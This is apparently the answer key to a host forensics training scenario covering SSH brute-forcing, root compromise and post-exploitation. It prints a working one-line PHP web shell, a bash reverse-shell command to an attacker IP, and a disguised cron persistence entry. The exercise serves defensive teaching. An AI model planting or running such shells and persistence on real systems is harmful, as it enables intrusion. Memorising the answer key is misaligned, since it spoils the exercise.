# Host DFIR Scenario 3: Answers & Key Findings

## 1. Initial Access & Authentication Analysis
- **Attacker IP Address:** `192.168.1.142` (SSH brute-forcing source IP)
- **Attempted Usernames:** `admin`, `ubuntu`, `guest`, `user`, `test`, `mysql`, `postgres`, `oracle`, `ftp`, `webadmin`, `operator`, `root` (various typical users)
- **Compromised Account:** `root`
- **Timestamp of Compromise:** `Jun 12 04:15:21`

## 2. Attacker Actions (Post-Exploitation)
- **First Directory Navigated to:** `/var/www/html`
- **Web Shell Created:** `/var/www/html/db-connect.php`
- **Web Shell Purpose:** It is a basic PHP web shell that takes command execution input via the `cmd` GET parameter and executes it using the `system()` function (`<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>`).
- **Download URL and local save path:**
  - **Download URL:** `http://192.168.1.200/updates/patch.sh` (Downloaded from the secondary attacker IP `192.168.1.200`)
  - **Local Save Path:** `/dev/shm/.systemd-login`

## 3. Persistence Mechanism
- **Cron Job Configuration:** Located at `/etc/cron.d/php-session-cleanup`. It runs `/dev/shm/.systemd-login` as `root` every 5 minutes (`*/5 * * * *`).
- **Persistence Script Location:** `/dev/shm/.systemd-login`
- **Script Content:** `bash -i >& /dev/tcp/192.168.1.200/8080 0>&1`
- **Connection Details:** Attempts to open a reverse TCP shell back to the secondary attacker IP `192.168.1.200` on port `8080`.
- **Key Observation:** The IP address `192.168.1.200` used for the reverse shell and script hosting is different from the SSH brute-forcing source IP (`192.168.1.142`). This indicates multi-stage or multi-host infrastructure used by the threat actor.
